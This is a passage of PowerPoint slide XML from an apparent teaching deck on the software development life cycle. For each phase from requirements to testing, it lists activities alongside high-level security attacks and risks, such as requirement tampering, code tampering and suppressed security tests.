            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The SDLC aims to produce a high-quality software that meets or exceeds customer expectations, reaches completion within times and cost estimates.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Requirement Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Planning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Designing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Deployment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Maintenance and Operations Phase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2482395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D4745-09BF-BA84-BAE4-A8E40B5FF4EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Software development life cycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{808DBF3D-16F5-B262-7E9E-65CB86230DFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="7704000" cy="3927750"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Requirement Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Identify and document the functional and non-functional requirements of the software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Gather requirements from stakeholders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Analyze and prioritize requirements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create requirement specifications documents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obtain approval from stakeholders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Social Engineering / Insider Threats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Requirement Tampering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Lack of security requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Absence of threat modeling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Ambiguous or incomplete requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3393039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69C21-84D9-9D8E-654E-D0C2285080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BFB422-1238-E367-6DB4-165A7A92E163}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42DFDB7C-F9D7-3A03-9255-F0ACBE2438D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1017725"/>
            <a:ext cx="7704000" cy="4068341"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Planning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Define the project scope, schedule, resources, and cost.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Develop project plans and timelines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Allocate resources (team, tools, budget).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Risk assessment and management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Define project milestones and deliverables.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Recommending or approving insecure third-party vendors, libraries, or tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Exclude security personnel or responsibilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Lack of Security Requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Insufficient Risk Assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> No Allocation for Security Resources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Unsecured Third-Party Dependencies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Undefined Compliance and Governance Goals</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3618621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086EB-C7A7-9B92-7A15-8AAEE900072C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8919D466-2557-2EE2-F96F-144DB0E19C24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7704000" cy="3742937"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Designing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Create the architecture and detailed design of the software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Define overall system architecture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create detailed specifications for components and modules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Design documentation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review and approve design documents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Design Manipulation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Reverse Engineering (in iterative designs): Attackers may study previous releases.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use of outdated frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Absence of secure design principles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Poor threat modeling</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="247638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11A90-4C57-FCC3-DD33-4E0A0705B4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FACC79-7568-B90F-6BAB-CEF8DE4FC080}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F07345E9-A954-EAD6-BBA8-BF4680D7ED86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="7704000" cy="3724740"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Development</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Convert the design into executable code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Write code according to design specifications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Follow coding standards and guidelines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use version control systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Malicious Code Injection by Developers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Third-party Code Vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Code Tampering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Lack of secure coding practices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Inadequate access controls in code repositories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Poor version control or audit logging code reviews.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="129883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5B146-CC12-01C4-8AF9-F0FB2B88018D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FDC6A63-BBBA-048D-CD10-3DE7AF9D2611}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="1215749"/>
            <a:ext cx="8187439" cy="3883963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Ensure the software meets requirements and is free of defects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create test plans and test cases.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform different types of testing (unit, integration, system, acceptance).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Report and fix bugs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Conduct regression testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test Data Exposure: Leakage of sensitive information used in testing environments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bypassing Security Tests: Insiders may suppress test results that reveal vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Testing in production-like environments without proper isolation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inadequate security or penetration testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Neglect of negative or boundary testing</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3365496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2762F-43BE-07E2-AFCA-64BF15EB0F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B589B-9563-BC88-A070-A83D2282A7EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
